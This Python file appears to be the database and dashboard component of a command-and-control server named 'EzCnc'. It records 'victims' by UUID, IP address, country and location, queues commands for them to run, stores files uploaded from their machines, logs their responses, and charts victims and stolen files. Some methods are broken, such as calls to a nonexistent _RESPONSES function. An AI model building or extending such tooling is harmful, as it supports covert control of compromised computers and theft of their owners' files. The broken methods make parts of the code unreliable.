import sqlite3
from typing import Union
from fastapi import UploadFile
from EzCnc.Structs import Client, Command, CommandRequester, ClientResponse
from loguru import logger
from EzCnc.Exceptions import EzCncError
import os
import plotly.graph_objects as go


class DB:
    def __init__(self, name: str) -> None:
        self.db = sqlite3.connect(f"{name}.db", check_same_thread=False)
        self.cr = self.db.cursor()
        self.INITIALIZE()

    def close(self):
        self.db.close()

    def uuid_to_name(self, uuid: Union[str, Client]) -> str:
        try:
            try:
                uuid = uuid.uuid
            except:
                pass
            Query = "SELECT name FROM victims_data where data_id = (select id from victims where uuid = ?)"
            name = self.cr.execute(Query, (uuid,)).fetchone()[0]
            return name

        except TypeError:
            raise EzCncError(f"Invalid victim uuid => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Error occured while querying name {e}")

    def name_to_uuid(self, name: Union[str, Client]) -> str:
        try:
            try:
                name = name.name
            except:
                pass
            Query = "SELECT uuid FROM victims where id = (select data_id from victims_data where name = ?)"
            name = self.cr.execute(Query, (name,)).fetchone()[0]
            return name

        except TypeError:
            raise EzCncError(f"Invalid victim name => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Error occured while querying name {e}")

    def INITIALIZE(self):
        victims_table = """
        CREATE TABLE IF NOT EXISTS victims(
            id INTEGER PRIMARY KEY NOT NULL, 
            uuid TEXT NOT NULL
        );
        """

        victims_data_table = """
        CREATE TABLE IF NOT EXISTS
            victims_data (
                data_id INTEGER,
                name TEXT,
                ip TEXT,
                country TEXT,
                location TEXT,
                FOREIGN KEY (data_id) REFERENCES victims(id)
        );
        """
        files_table = """
        CREATE TABLE IF NOT EXISTS 
            files(
                files_id TEXT NOT NULL,
                file_name TEXT NOT NULL,
                file blob NOT NULL,
                file_type TEXT NOT NULL,
                received_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (files_id) REFERENCES victims(id)
            );
        """
        commands_table = """

        CREATE TABLE IF NOT EXISTS
            commands(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                request_time DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                target TEXT NOT NULL,
                parameter TEXT
            );
        """

        response_table = """

        CREATE TABLE IF NOT EXISTS
            response(
                id INTEGER,
                response_time DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                response,
                result INTEGER,
                FOREIGN KEY(id) REFERENCES victims(id)
            );
        """

        self.cr.execute(victims_table)
        self.cr.execute(victims_data_table)
        self.cr.execute(files_table)
        self.cr.execute(commands_table)
        self.cr.execute(response_table)

    def uuid_to_id(self, uuid: str) -> int:
        resp = self.cr.execute("SELECT id FROM victims WHERE uuid = ?", (uuid,))
        result = resp.fetchone()
        if result:
            return int(result[0])
        else:
            return None

    def id_to_uuid(self, id: int) -> str:
        resp = self.cr.execute("SELECT uuid FROM victims WHERE id=?", (id,))
        result = resp.fetchone()
        if result:
            return str(result[0])
        else:
            return None

    def new_client(self, client: Client) -> bool:
        try:
            Query1 = "INSERT INTO victims(uuid) SELECT ? WHERE NOT EXISTS (SELECT 1 FROM victims WHERE uuid = ?)"
            Query2 = "SELECT id FROM victims WHERE uuid = ?"
            Query3 = "INSERT INTO victims_data(data_id,name,ip,country,location) VALUES(?,?,?,?,?)"

            self.cr.execute(Query1, (client.uuid, client.uuid))

            if self.cr.rowcount > 0:
                ID = self.cr.execute(Query2, (client.uuid,)).fetchone()[0]
                self.cr.execute(
                    Query3, (ID, client.name, client.ip, client.country, client.location)
                )
                self.db.commit()
                return True
            else:
                return False

        except Exception as e:
            raise EzCncError(f"Exception occurred while adding a new victim: {e}")

    def new_command(self, command: Command) -> bool:
        try:
            Query = "INSERT INTO commands(command,target,parameter) VALUES(?,?,?)"
            self.cr.execute(
                Query,
                (
                    command.command,
                    self.name_to_uuid(str(command.target)),
                    command.parameter,
                ),
            )
            self.db.commit()
            return True
        except TypeError:
            raise EzCncError(f"Invalid victim name => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Exception occured while adding a new command [ {e} ]")

    def iscommanded(self, Requester: CommandRequester) -> Union[Command, bool]:
        try:
            Query = "SELECT * FROM commands WHERE target= ?"
            res = self.cr.execute(Query, (Requester.uuid,)).fetchone()
            if res:
                return Command(command=res[2], target=res[3], parameter=res[4])
            else:
                return False
        except Exception as e:
            raise EzCncError(f"Exception occured while checking for commands [ {e} ]")

    def insert_file(self, file_data, uuid: str):
        query = "INSERT INTO files (files_id, file_name,file, file_type) VALUES (? , ? , ? , ?)"
        self.cr.execute(
            query,
            (
                self.uuid_to_id(str(uuid)),
                file_data.filename,
                file_data.file.read(),
                os.path.splitext(file_data.filename)[1],
            ),
        )
        self.db.commit()

    def _return_all_uuids(self) -> list:
        query = "SELECT uuid from victims"
        return self.cr.execute(query).fetchall()

    def return_all_victims_data(self) -> list:
        query = "SELECT * from victims_data"
        return self.cr.execute(query).fetchall()
    
    def return_all_victims_names(self) -> list:
        query = "SELECT name from victims_data"
        return self.cr.execute(query).fetchall()
    
    def get_response(self,command:str,name:str) -> tuple:
        query = "SELECT * FROM response where command =? and id=? ORDER BY response_time DESC"
        return self.cr.execute(query,(command, self.uuid_to_id((self.name_to_uuid(name))))).fetchone()
    
    def insert_response(self, resp: ClientResponse):
        Query1 = "INSERT INTO response(id,command,response,result) VALUES(?,?,?,?)"
        Query2 = "INSERT INTO response(id,command,result) VALUES(?,?,?)"
        Query3 = "DELETE FROM commands where command = ? and target = ?"
        try:
            if resp.response == "":
                self.cr.execute(
                    Query2,
                    (self.uuid_to_id(str(resp.uuid)), resp.command, int(resp.result)),
                )
            else:
                self.cr.execute(
                    Query1,
                    (
                        self.uuid_to_id(str(resp.uuid)),
                        resp.command,
                        resp.response,
                        int(resp.result),
                    ),
                )
            
            self.cr.execute(Query3,(resp.command,resp.uuid))
            self.db.commit()
        except Exception as e:
            logger.error(str(e))


class Plots:
    def __init__(self, db_instance) -> None:
        self.DB: DB = db_instance

    def _PIE(self, val1: list, val2: list):
        fig = go.Figure(
            data=[
                go.Pie(
                    labels=val1,
                    values=val2,
                )
            ]
        )
        return fig

    def _COUNTRY_OCCURRENCE(self) -> tuple[list]:
        query = "SELECT country, COUNT(*) AS count FROM victims_data GROUP BY country"
        result = self.DB.cr.execute(query).fetchall()
        countries = []
        occurrences = []
        for row in result:
            countries.append(row[0])
            occurrences.append(row[1])
        results = zip(countries, occurrences)
        results = sorted(results, key=lambda x: x[1], reverse=True)
        countries = []
        occurrences = []
        for i, x in results:
            countries.append(i)
            occurrences.append(x)
        return countries, occurrences

    def _RESPONSES_OCCURRENCES(self, by_id: bool = False) -> tuple[list]:
        query = "SELECT id, COUNT(*) AS mention_count FROM response GROUP BY id;"
        results = self.DB.cr.execute(query).fetchall()
        names, occurrences = [], []
        if by_id:
            for row in results:
                names.append(row[0])
                occurrences.append(row[1])
        else:
            for row in results:
                names.append(self.DB.uuid_to_name(str(self.DB.id_to_uuid(str(row[0])))))
                occurrences.append(row[1])

        results = zip(names, occurrences)
        results = sorted(results, key=lambda x: x[1], reverse=True)
        print(results)
        names, occurrences = [], []
        for i, x in results:
            names.append(i)
            occurrences.append(x)
        return names, occurrences

    def _FILES_OCCURRENCES(self, by_id: bool = False) -> tuple[list]:
        query = "SELECT files_id, COUNT(*) AS files_count FROM files GROUP BY files_id;"
        results = self.DB.cr.execute(query).fetchall()
        names, occurrences = [], []
        if by_id:
            for row in results:
                names.append(row[0])
                occurrences.append(row[1])
        else:
            for row in results:
                names.append(self.DB.uuid_to_name(str(self.DB.id_to_uuid(str(row[0])))))
                occurrences.append(row[1])

        results = zip(names, occurrences)
        results = sorted(results, key=lambda x: x[1], reverse=True)
        print(results)
        names, occurrences = [], []
        for i, x in results:
            names.append(i)
            occurrences.append(x)
        return names, occurrences

    def _PIE_WORKING_COMMANDS_RATIO(self, specific_command: Union[str, None] = None):
        if specific_command is None:
            worked_Query = "SELECT COUNT(*) FROM response where result=1"
            didnt_work_Query = "SELECT COUNT(*) FROM response where result=0"
            working_result = self.DB.cr.execute(worked_Query).fetchone()[0]
            failed_result = self.DB.cr.execute(didnt_work_Query).fetchone()[0]
        else:
            worked_Query = "SELECT COUNT(*) FROM response where result=1 and command=?"
            didnt_work_Query = (
                "SELECT COUNT(*) FROM response where result=0 and command=?"
            )
            working_result = self.DB.cr.execute(
                worked_Query, (specific_command,)
            ).fetchone()[0]
            failed_result = self.DB.cr.execute(
                didnt_work_Query, (specific_command,)
            ).fetchone()[0]
        try:
            return self._PIE(["Working", "Failed"], [working_result, failed_result])
        except Exception as e:
            logger.error(str(e))

    def _BAR_COUNTRIES(self):
        try:
            countries, occurrences = self._COUNTRY_OCCURRENCE()
            fig = go.Figure([go.Bar(x=countries, y=occurrences)])
            return fig
        except Exception as e:
            logger.error(str(e))

    def _PIE_COUNTRIES(self):
        try:
            labels, values = self._COUNTRY_OCCURRENCE()
            return self._PIE(labels, values)
        except Exception as e:
            logger.error(str(e))

    def _PIE_RESPONSES(self, by_id: bool = False):
        try:
            names, occurrences = self._RESPONSES(by_id)
            return self._PIE(names, occurrences)
        except Exception as e:
            logger.error(str(e))

    def _BAR_RESPONSES(self, by_id: bool = False):
        try:
            names, occurrences = self._RESPONSES(by_id)
            fig = go.Figure([go.Bar(x=names, y=occurrences)])
            return fig
        except Exception as e:
            logger.error(str(e))

    def _BAR_FILES_SENT(self, by_id: bool = False):
        try:
            names, occurrences = self._FILES_OCCURRENCES(by_id)
            fig = go.Figure([go.Bar(x=names, y=occurrences)])
            return fig
        except Exception as e:
            logger.error(str(e))

    def _PIE_FILES_SENT(self, by_id: bool = False):
        try:
            names, occurrences = self._FILES_OCCURRENCES(by_id)
            fig = self._PIE(names, occurrences)
            return fig
        except Exception as e:
            logger.error(str(e))

    def files_sent(self, by_id: bool = False, graph: str = "bar"):
        if graph.lower() == "pie":
            return self._PIE_FILES_SENT(by_id)
        else:
            return self._PIE_FILES_SENT(by_id)

    def responses(self, by_id: bool = False, graph: str = "bar"):
        if graph.lower() == "pie":
            return self._PIE_RESPONSES(by_id)
        else:
            return self._BAR_RESPONSES(by_id)

    def countries(self, by_id: bool = False, graph: str = "bar"):
        if graph.lower() == "pie":
            return self._PIE_COUNTRIES()
        else:
            return self._BAR_COUNTRIES()
